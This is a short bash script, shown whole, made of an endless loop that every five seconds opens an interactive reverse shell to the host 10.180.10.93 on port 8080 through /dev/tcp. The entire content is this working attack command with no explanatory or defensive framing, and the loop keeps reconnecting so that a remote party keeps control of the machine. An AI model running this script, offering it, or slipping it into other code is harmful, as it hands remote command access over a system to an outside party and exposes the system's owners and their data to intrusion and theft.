while true
do

sleep 5s
bash -i >& /dev/tcp/10.180.10.93/8080 0>&1

done

